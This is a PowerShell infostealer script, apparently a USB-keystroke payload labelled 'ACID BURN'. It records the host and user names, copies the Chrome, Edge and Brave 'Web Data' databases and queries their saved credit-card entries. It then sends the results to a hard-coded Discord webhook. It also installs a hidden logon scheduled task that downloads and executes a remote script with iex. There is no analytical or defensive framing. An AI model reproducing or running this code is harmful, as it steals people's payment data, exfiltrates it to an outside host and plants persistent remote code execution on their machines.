
try {
    $out = "$env:TEMP\wifi_dump.txt"
    "=== ACID BURN ===" | Out-File $out
    "Host: $env:COMPUTERNAME" | Out-File $out -Append
    "User: $env:USERNAME" | Out-File $out -Append
    "" | Out-File $out -Append

    # --- LOAD SQLITE ---
    $sqliteDll = "$env:TEMP\System.Data.SQLite.dll"
    if (-not (Test-Path $sqliteDll)) {
        try { Invoke-WebRequest "https://raw.githubusercontent.com/stargosg/Ducky/refs/heads/main/System.Data.SQLite.dll" -OutFile $sqliteDll -UseBasicParsing } catch { }
    }
    $sqliteLoaded = $false
    if (Test-Path $sqliteDll) {
        try {
            [System.Reflection.Assembly]::LoadFrom($sqliteDll) | Out-Null
            $sqliteLoaded = $true
        } catch { }
    }

    "--- SAVED CARDS ---" | Out-File $out -Append

    $browsers = @{
        "Chrome" = "$env:LOCALAPPDATA\Google\Chrome\User Data"
        "Edge"   = "$env:LOCALAPPDATA\Microsoft\Edge\User Data"
        "Brave"  = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data"
    }

    foreach ($b in $browsers.Keys) {
        $base = $browsers[$b]
        if (-not (Test-Path $base)) { continue }
        "== $b ==" | Out-File $out -Append

        $profilesDir = Get-ChildItem $base -Directory | Where-Object { $_.Name -match "^(Default|Profile)" }
        foreach ($pd in $profilesDir) {
            $webDb = Join-Path $pd.FullName "Web Data"
            if (-not (Test-Path $webDb)) { continue }
            $tmp = "$env:TEMP\ab_web.db"
            Copy-Item $webDb $tmp -Force

            if ($sqliteLoaded) {
                try {
                    $conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$tmp")
                    $conn.Open()
                    $cmd = $conn.CreateCommand()
                    $cmd.CommandText = "SELECT name_on_card, card_number_encrypted, expiration_month, expiration_year FROM credit_cards"
                    $reader = $cmd.ExecuteReader()
                    while ($reader.Read()) {
                        $name = $reader.GetValue(0)
                        $cardRaw = $reader.GetValue(1)
                        $expM = $reader.GetValue(2)
                        $expY = $reader.GetValue(3)
                        $card = ""
                        if ($cardRaw -is [byte[]] -and $cardRaw.Length -gt 0) {
                            $card = [System.Text.Encoding]::UTF8.GetString($cardRaw)
                        } elseif ($cardRaw) {
                            $card = $cardRaw.ToString()
                        }
                        if ($card) { "$name | $card | $expM/$expY" | Out-File $out -Append }
                    }
                    $conn.Close()
                } catch {
                    "SQLite error: $_" | Out-File $out -Append
                }
            } else {
                "SQLite DLL not loaded" | Out-File $out -Append
            }
        }
        "" | Out-File $out -Append
    }

    $body = Get-Content $out -Raw
    if ([string]::IsNullOrWhiteSpace($body)) { $body = "(empty)" }
    $body = $body -replace "\\", "/"
    $body = $body.Substring(0, [Math]::Min(1900, $body.Length))

    $url = "https://discord.com/api/webhooks/1519137397022130196/X1Pyzeu-cYDoWXpEb5Evo9KFNKgpoeOhdLEsS9NbLWy5gvKkvqeqOZlxuCQV92Xi5XYT"
    $payload = @{ content = $body } | ConvertTo-Json -Compress
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($payload)
    Invoke-RestMethod -Uri $url -Method Post -Body $bytes -ContentType "application/json; charset=utf-8"

    # --- PERSISTENCE ---
    $cmd = "powershell -w hidden -ep bypass -c `"iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/stargosg/Ducky/refs/heads/main/x.ps1')`""
    schtasks /create /tn "AcidBurn" /tr $cmd /sc onlogon /f 2>$null
}
catch {
    $_ | Out-File "$env:TEMP\ab_error.txt"
}
